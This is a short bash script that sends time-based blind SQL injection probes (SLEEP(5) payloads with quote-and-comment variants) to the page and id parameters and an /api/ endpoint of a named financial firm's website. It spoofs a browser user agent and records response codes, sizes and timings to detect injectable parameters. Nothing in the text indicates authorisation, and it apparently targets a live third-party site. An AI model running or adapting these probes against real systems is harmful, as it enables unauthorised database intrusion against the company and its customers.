#!/bin/bash
cd "$WORK_PATH"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
p(){ curl -s -A "$UA" -o /tmp/ox_$$ -w "%{http_code} %{size_download} t=%{time_total}" "$1"; echo " md5=$(md5sum /tmp/ox_$$|cut -c1-8) :: $1"; }
p 'https://www.infinitycapital.bh/?page=2'
p 'https://www.infinitycapital.bh/?page=3'
p 'https://www.infinitycapital.bh/?page=2%20AND%20SLEEP(5)'
p 'https://www.infinitycapital.bh/?page=2%27%20AND%20SLEEP(5)--%20-'
p 'https://www.infinitycapital.bh/?id=1%27%20AND%20SLEEP(5)--%20-'
p 'https://www.infinitycapital.bh/api/?id=1%27%20AND%20SLEEP(5)--%20-'
